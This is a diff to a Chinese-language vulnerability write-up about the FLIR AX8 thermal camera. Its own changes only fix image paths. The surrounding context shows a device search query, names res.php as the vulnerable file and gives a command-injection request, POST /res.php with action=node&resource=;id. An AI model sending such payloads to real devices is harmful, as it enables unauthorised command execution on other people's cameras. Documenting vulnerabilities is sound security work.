@@ -20,7 +20,7 @@ app="FLIR-FLIR-AX8"
 
 登录页面
 
-![image-20220913103521047](./images/202209131036578.png)
+![image-20220913103521047](images/202209131036578.png)
 
 出现漏洞的文件为 **res.php**
 
@@ -121,4 +121,4 @@ POST /res.php
 action=node&resource=;id
 ```
 
-![1](./images/202209131037844.png)
+![](images/202209131037844.png)
